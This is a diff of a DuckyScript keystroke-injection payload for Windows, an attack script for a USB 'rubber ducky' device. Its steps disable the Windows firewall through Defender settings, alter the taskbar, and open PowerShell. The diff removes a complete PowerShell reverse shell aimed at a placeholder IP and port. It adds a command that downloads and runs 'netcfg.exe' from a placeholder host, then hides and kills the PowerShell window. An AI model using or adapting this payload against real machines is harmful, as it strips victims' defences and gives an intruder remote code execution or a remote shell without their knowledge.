@@ -1,12 +1,12 @@
 REM Disable Firewall
-DELAY 500 
+DELAY 700
 GUI r 
-DELAY 100 
+DELAY 150 
 STRING windowsdefender: 
 ENTER 
-DELAY 1000
+DELAY 1500
 ENTER
-DELAY 200
+DELAY 400
 TAB
 DELAY 50
 TAB
@@ -27,7 +27,7 @@ ALT F4
 
 REM Disable Icons
 GUI i
-DELAY 800
+DELAY 1200
 STRING task
 DELAY 400
 DOWNARROW
@@ -37,9 +37,37 @@ DELAY 50
 DOWNARROW
 DELAY 50
 ENTER
-DELAY 300
+DELAY 1200
 SPACE
-DELAY 200
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 50
+TAB
+DELAY 50
+SPACE
+DELAY 500
 ALT F4
 
 REM Rev Shell
@@ -48,10 +76,10 @@ DELAY 100
 STRING powershell 
 ENTER 
 DELAY 400
-STRING Start-Job -ScriptBlock{$client = New-Object System.Net.Sockets.TCPClient("[IP Address]",[Port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
+STRING Start-Job -ScriptBlock{Invoke-WebRequest -Uri "http://[IP]:8000/netcfg.exe" -OutFile ./netcfg.exe ; ./netcfg.exe}
 DELAY 150
 ENTER
-STRING PowerShell -WindowStyle hidden
+STRING PowerShell -WindowStyle hidden ; stop-process -Id $PID
 DELAY 50
 ENTER
 
